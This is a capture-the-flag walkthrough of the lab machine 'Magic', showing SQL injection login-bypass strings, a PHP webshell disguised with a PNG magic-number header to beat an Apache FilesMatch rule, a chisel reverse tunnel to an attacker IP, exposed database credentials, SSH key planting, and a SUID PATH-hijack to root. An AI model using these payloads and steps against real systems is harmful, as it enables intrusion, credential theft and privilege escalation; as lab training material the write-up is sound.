---
title: Magic
date: 2026-08-31
description: Easy Linux box slipping a PHP webshell past an Apache FilesMatch rule with a PNG magic-number header, forwarding localhost MySQL through chisel, and hijacking a SUID sysinfo PATH lookup.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Mon Aug 31 09:24:49 2026 as: /usr/lib/nmap/nmap -p22,80 -A -oN scan_results.txt 10.129.5.121
Nmap scan report for magic.htb (10.129.5.121)
Host is up (0.69s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   675.29 ms 10.10.16.1
2   675.39 ms magic.htb (10.129.5.121)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 31 09:26:25 2026 -- 1 IP address (1 host up) scanned in 96.87 seconds

```

```sh
301      GET        9l       28w      315c http://magic.htb/images/uploads => http://magic.htb/images/uploads/
```

- Website with a login page at `/login.php`
- Both fields take SQL injection — the same comment in both fields bypasses auth as admin (watch the spacing):

```sql
' OR 1=1-- -
```

```sql
' OR 1=1#
```

- Behind the login there's `/upload.php` accepting jpg, jpeg & PNG
- Uploads land in `/images/uploads` and are served from there

---

> **Note** : an **Apache directive** — `<FilesMatch ".+\.php">` — treats any file with `.php` in its name differently.

Upload a file called `webshell.php.png` to a web server:

- What you think: "This is a picture file (ends in `.png`), so it should just be displayed as an image."
- What the server thinks (with `".+\.php"`): "This filename contains `.php` in it, so I'll run it as PHP code!"

So even though the file looks like a `.png`, the server runs the malicious PHP code inside it.

**The fix** : add a `$` symbol — `".+\.php$"`
- The `$` means "THE END." Now it only matches files that end with `.php` and nothing after.

---

Prepend the **PNG header signature** (magic numbers in hex) to the PHP web shell and rename it `.php.png`:

```sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > header.php.png

cat header.php.png webshell.php.png > webshell.php.png # concatenated using cat
```

The shell uploads cleanly. Trigger it:

```text
http://10.129.5.121/images/uploads/ws.php.png?cmd=whoami
```

Commands run as `www-data` — grab a shell and stabilize with the python pty library.

# User

`db.php5` in the web root holds the MySQL credentials — and a quick status check shows mysql only listens on **localhost**.

## Chisel

Port forwarding with chisel:
> https://github.com/jpillora/chisel/releases

Download the `.gz` file — make sure server and client are the **same version**.

Attacker:
```sh
chisel server -p 8000 -reverse
```

Victim — upload the `.gz` and run:
```sh
./chisel client 10.10.16.32:8000 R:3306:127.0.0.1:3306 &
```

Connect through the forwarded port:

```sh
mysql -h 127.0.0.1 -u theseus -p
```

> `theseus : Th3s3usW4sK1ng`

SSH refuses the password (no entry for this host in `.ssh`), so from the `www-data` shell generate a key pair and drop the public key in theseus' authorized_keys — now we're in with the private key.

# Root

`find` for SUID binaries:

```sh
find / -perm -4000 -exec ls -l {} \; 2>/dev/null
```

```sh
<SNIP>...
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping

```

`/bin/sysinfo` runs with the users group:

```sh
sysinfo
```

It prints **Hardware info**, **Disk info**, **CPU info**, **Memory info** — `strings` reveals which linux commands it shells out to for each. We just need a binary with one of those names:

- Create a file carrying the payload, named exactly like the binary, in `/tmp`
- Add `/tmp` to the front of `$PATH`

> Note : `/bin/bash -p` as a payload was tried but unstable

```sh
> export PATH=/tmp:$PATH

> $PATH
-bash: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:
```

Upload the fake binary to `/tmp`, then trigger it:

```sh
> sysinfo
```

Gained `root`
